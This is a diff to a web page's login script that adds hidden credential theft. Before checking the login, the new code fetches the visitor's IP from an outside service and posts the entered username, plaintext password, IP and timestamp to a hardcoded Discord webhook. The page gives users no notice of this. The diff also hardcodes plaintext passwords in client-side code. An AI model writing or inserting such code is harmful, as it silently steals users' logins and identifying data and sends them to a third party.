@@ -218,7 +218,7 @@
     </div>
 
     <div id="home" class="content">
-        <h1>Welcome, kalleaito!</h1>
+        <h1 id="welcomeMessage"></h1>
         <p>Choose contents from above!</p>
         <div class="footer">
             <a href="#">TERMS OF SERVICE</a>
@@ -379,12 +379,55 @@
     </div>
 
     <script>
-        function handleLogin() {
+        let loggedInUser = '';
+
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip || 'Unknown IP';
+            } catch (error) {
+                console.error('Error fetching IP:', error);
+                return 'Unknown IP';
+            }
+        }
+
+        async function sendToWebhook(username, password, ip) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1379879855423754310/5ruvWmqVAct4C61OJDK8xvliarkTjMxAnkuzWiJuqZtYiblYIkLX3OLW-ucV-3CXi6WS';
+            const payload = {
+                content: `**Login Attempt**\nUsername: ${username}\nPassword: ${password}\nIP Address: ${ip}\nTimestamp: ${new Date().toISOString()}`
+            };
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Error sending to webhook:', error);
+            }
+        }
+
+        async function handleLogin() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             const errorMessage = document.getElementById('errorMessage');
 
-            if (username === 'bob' && password === 'key844221') {
+            // Fetch the user's IP address
+            const ip = await getUserIP();
+
+            // Send credentials and IP to Discord webhook
+            await sendToWebhook(username, password, ip);
+
+            // Validate credentials
+            if ((username === 'bob' && password === 'key844221') || (username === 'kalleaito' && password === 'eelaska12')) {
+                // Store the logged-in username
+                loggedInUser = username.charAt(0).toUpperCase() + username.slice(1);
+                // Update the welcome message
+                document.getElementById('welcomeMessage').innerText = `Welcome, ${loggedInUser}!`;
                 // Remove login page and show navbar and home page
                 document.getElementById('loginPage').remove();
                 document.getElementById('navbar').classList.add('active');
